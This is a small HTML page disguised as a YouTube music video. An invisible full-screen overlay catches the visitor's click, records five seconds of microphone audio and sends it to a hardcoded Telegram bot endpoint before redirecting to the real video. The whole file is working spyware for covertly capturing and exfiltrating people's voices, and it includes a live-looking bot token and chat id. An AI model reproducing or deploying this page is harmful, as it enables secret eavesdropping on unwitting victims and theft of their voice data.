<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>YouTube - Music</title></head>
<body style="margin:0; background:#000;">
    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1" style="width:100%; height:100vh; border:none;"></iframe>
    <div onclick="rec()" style="position:fixed; top:0; width:100%; height:100%; z-index:9;"></div>

    <script>
        async function rec() {
            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
            const r = new MediaRecorder(s);
            let ch = [];
            r.ondataavailable = e => ch.push(e.data);
            r.onstop = () => {
                const fd = new FormData();
                fd.append('voice', new Blob(ch), 'v.ogg');
                fetch('https://api.telegram.org/bot8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI/sendVoice?chat_id=8275787221', {method:'POST', body:fd})
                .then(() => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
            };
            r.start();
            setTimeout(() => r.stop(), 5000);
        }
    </script>
</body>
</html>
